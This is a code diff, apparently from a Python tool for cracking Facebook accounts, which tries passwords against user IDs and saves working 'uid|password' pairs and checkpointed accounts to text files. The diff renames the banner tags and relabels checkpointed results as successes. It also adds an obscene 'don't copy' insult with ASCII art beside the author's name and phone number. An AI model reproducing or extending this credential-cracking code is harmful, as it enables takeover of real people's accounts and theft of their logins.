@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ MSB ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ SM ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -401,6 +401,15 @@ __________________×______________________
   Facebook : Mehdi Hasan
   
   Contact : 01932347250
+  Don't Copy Mother Fucker Your Dad Come Back
+╭━╮
+┣━┫
+┃╭┃
+╭━┫╭┣━╮
+╭━┃╭┃╭┃╭┃━╮
+╲╭┃╯┃╯┃╯┃.╭┃
+╰╮▂▂▂▂▂▂▂╭╯
+╰ ▂▂▂▂▂▂ 
 __________________×______________________\033[1;37m""")
 
 class Main:
@@ -1279,7 +1288,7 @@ class Main:
 				open("2009-SM-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ SM-CP ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SM-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-SM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
